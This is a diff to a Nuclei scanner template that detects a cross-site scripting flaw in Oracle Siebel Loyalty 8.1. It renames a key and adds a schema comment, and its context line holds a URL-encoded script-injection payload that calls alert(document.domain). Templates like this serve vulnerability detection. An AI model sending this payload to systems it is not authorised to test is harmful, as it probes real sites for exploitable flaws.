@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: oracle-siebel-xss
 info:
   name: Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
@@ -14,7 +15,7 @@ info:
     cwe-id: CWE-79
   remediation: Upgrade to Siebel Loyalty version 8.2 or later.
   tags: xss,oracle,siebel
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
